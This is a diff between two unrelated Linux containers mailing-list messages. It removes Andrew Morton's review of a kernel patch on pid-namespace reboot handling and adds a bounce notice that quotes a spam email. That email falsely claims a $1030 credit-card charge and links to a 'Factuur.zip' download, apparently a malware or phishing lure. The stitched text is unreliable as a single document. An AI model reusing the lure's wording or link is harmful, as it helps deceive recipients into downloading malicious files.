@@ -1,14 +1,11 @@
-From: Andrew Morton <akpm-de/tnXTf+JLsfHDXvbKv3WD2FQJk+8+b@public.gmane.org>
-Subject: Re: [PATCH 1/1][V3] Add reboot_pid_ns to handle the reboot syscall
-Date: Tue, 6 Dec 2011 17:16:17 -0800
-Message-ID: <20111206171617.e31bc3a6.akpm@linux-foundation.org>
-References: <1323030290-22216-1-git-send-email-daniel.lezcano@free.fr>
-	<1323030290-22216-2-git-send-email-daniel.lezcano@free.fr>
+From: Mail Delivery System <Mailer-Daemon-cQ0z+P2lDt2Pkv7T40lAaZ8P8UcWk/zy@public.gmane.org>
+Subject: Mail delivery failed: returning message to sender
+Date: Wed, 07 Dec 2011 02:43:44 +0100
+Message-ID: <E1RY6Xw-0006ak-Jo@server81.happyhosting.nl>
 Mime-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-In-Reply-To: <1323030290-22216-2-git-send-email-daniel.lezcano-GANU6spQydw@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
 List-Archive: <http://lists.linuxfoundation.org/pipermail/containers/>
@@ -18,77 +15,80 @@ List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
 Sender: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-To: Daniel Lezcano <daniel.lezcano-GANU6spQydw@public.gmane.org>
-Cc: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org, oleg-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org, linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Michael Kerrisk <mtk.manpages-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>, Ulrich Drepper <drepper-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>
+To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-On Sun,  4 Dec 2011 21:24:50 +0100
-Daniel Lezcano <daniel.lezcano-GANU6spQydw@public.gmane.org> wrote:
+This message was created automatically by mail delivery software.
 
-> In the case of a child pid namespace, rebooting the system does not
-> really makes sense. When the pid namespace is used in conjunction
-> with the other namespaces in order to create a linux container, the
-> reboot syscall leads to some problems.
-> 
-> A container can reboot the host. That can be fixed by dropping
-> the sys_reboot capability but we are unable to correctly to poweroff/
-> halt/reboot a container and the container stays stuck at the shutdown
-> time with the container's init process waiting indefinitively.
-> 
-> After several attempts, no solution from userspace was found to reliabily
-> handle the shutdown from a container.
-> 
-> This patch propose to store the reboot value in the 16 upper bits of the
-> exit code from the processes belonging to a pid namespace which has
-> rebooted. When the reboot syscall is called and we are not in the initial
-> pid namespace, we kill the pid namespace.
-> 
-> By this way the parent process of the child pid namespace to know if
-> it rebooted or not and take the right decision.
+A message that you sent could not be delivered to one or more of its
+recipients. This is a permanent error. The following address(es) failed:
 
-hm, modifying the exit code in this manner is a strange interface.  I
-didn't see that coming.  Perhaps some additional justification for this
-idea should be added to the changelog, along with discussion of
-alternative schemes.  I don't immediately see any problems with it,
-but, odd...  I wonder what potential it has to upset existing
-userspace.
+  swpp-Adoy4L/HiLOeL6BCYp71Hw@public.gmane.org
+    The mail server detected your message as spam and has prevented delivery (100).
 
-Also, do we need to reserve all upper 16 bits of the exit code?  It
-would be better to formally leave some free for future use.
+------ This is a copy of the message, including all the headers. ------
 
-Also, this alters the interface of wait4() and friends, yes?  If so,
-that should be documented in the manpages.  Please Cc Michael on such
-changes.
+Return-path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: from [95.141.36.83] (helo=radiobytenetwork.it)
+	by server81.happyhosting.nl with esmtp (Exim 4.69)
+	(envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
+	id 1RY6Xu-0006ae-2z
+	for swpp-Adoy4L/HiLOeL6BCYp71Hw@public.gmane.org; Wed, 07 Dec 2011 02:43:44 +0100
+Received: from [95.141.36.83] by radiobytenetwork.it id jRrPTLSpeCA6P; Wed, 07 Dec 2011 02:43:34 +0100
+Message-ID: <00bf01ccb481$a04bba00$14000a0a-2kRSJbaDU6WO2/wZUiRoQzUZDU+1vuVT@public.gmane.org>
+From: "Info" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <swpp-Adoy4L/HiLOeL6BCYp71Hw@public.gmane.org>
+Subject: Your order reference is 241199.
+Date: Wed, 07 Dec 2011 02:43:34 +0100
+MIME-Version: 1.0
+Content-Type: text/plain;
+	charset="windows-1252"
+Content-Transfer-Encoding: 8bit
+X-Spam-Subject: ***SPAM*** Your order reference is 241199.
+X-Spam-Status: Yes, score=12.7
+X-Spam-Score: 127
+X-Spam-Bar: ++++++++++++
+X-Spam-Report: Spam detection software, running on the system "server81.happyhosting.nl", has
+	identified this incoming email as possible spam.  The original message
+	has been attached to this so you can view it (if it isn't spam) or label
+	similar future email.  If you have any questions, see
+	the administrator of that system for details.
+	Content preview:  Dear client, Thank you for the order, id: 448366. Your credit
+	card will be charged for 1030 dollars. [...] 
+	Content analysis details:   (12.7 points, 5.0 required)
+	pts rule name              description
+	---- ---------------------- --------------------------------------------------
+	1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in bl.spamcop.net
+	[Blocked - see <http://www.spamcop.net/bl.shtml?95.141.36.83>]
+	2.6 RCVD_IN_SBL            RBL: Received via a relay in Spamhaus SBL
+	[95.141.36.83 listed in zen.spamhaus.org]
+	1.3 RCVD_IN_RP_RNBL        RBL: Relay in RNBL,
+	https://senderscore.org/blacklistlookup/
+	[95.141.36.83 listed in bl.score.senderscore.com]
+	0.0 FORGED_RELAY_MUA_TO_MX FORGED_RELAY_MUA_TO_MX
+	1.6 RCVD_IN_BRBL_LASTEXT   RBL: RCVD_IN_BRBL_LASTEXT
+	[95.141.36.83 listed in bb.barracudacentral.org]
+	0.9 SPF_FAIL               SPF: sender does not match SPF record (fail)
+	[SPF failed: Please see http://www.openspf.org/Why?s=mfrom;id=containers%40lists.linux-foundation.org;ip=95.141.36.83;r=server81.happyhosting.nl]
+	0.0 RATWARE_OUTLOOK_NONAME Bulk email fingerprint (Outlook no name) found
+	1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
+	3.7 RATWARE_MS_HASH        Bulk email fingerprint (msgid ms hash) found
+X-Spam-Flag: YES
 
-Also, this affects the data delivered by taskstats, I believe.  Please
-check this, test it, document it in the changelog and update
-getdelays.c appropriately.
 
-Also, glibc might be affected.  For symmetry we might want to add a
-WIFREBOOT() or something.  And we now expect waitid() to fill in extra
-bits in siginfo_t.si_status, which assumes that glibc (and other
-libc's!) aren't using a u8 in there somewhere.  etcetera.  This all
-should be tested, and reviewed by Uli (please).
 
->
-> ...
->
-> --- a/kernel/sys.c
-> +++ b/kernel/sys.c
-> @@ -444,6 +444,9 @@ SYSCALL_DEFINE4(reboot, int, magic1, int, magic2, unsigned int, cmd,
->  	                magic2 != LINUX_REBOOT_MAGIC2C))
->  		return -EINVAL;
->  
-> +	if (task_active_pid_ns(current) != &init_pid_ns)
-> +		return reboot_pid_ns(task_active_pid_ns(current), cmd);
 
-This adds a bunch of useless code if CONFIG_PID_NS=n.  It would be
-better to do
+Dear client, 
 
-#ifdef CONFIG_PID_NS
-extern void pidns_handle_reboot(int cmd);
-#else
-static inline void pidns_handle_reboot(int cmd)
-{
-}
-#endif
+Thank you for the order, 
+id: 448366.
+
+Your credit card will be charged for 1030 dollars.
+
+Information about the order and delivery located at:
+
+http://leclostanpere.fr/docdown/Factuur.zip?id:284Generation_user=swpp-Adoy4L/HiLOeL6BCYp71Hw@public.gmane.org
+
+____________________________
+Best regards, ticket service.
+Tel.: (626) 123 15 271              
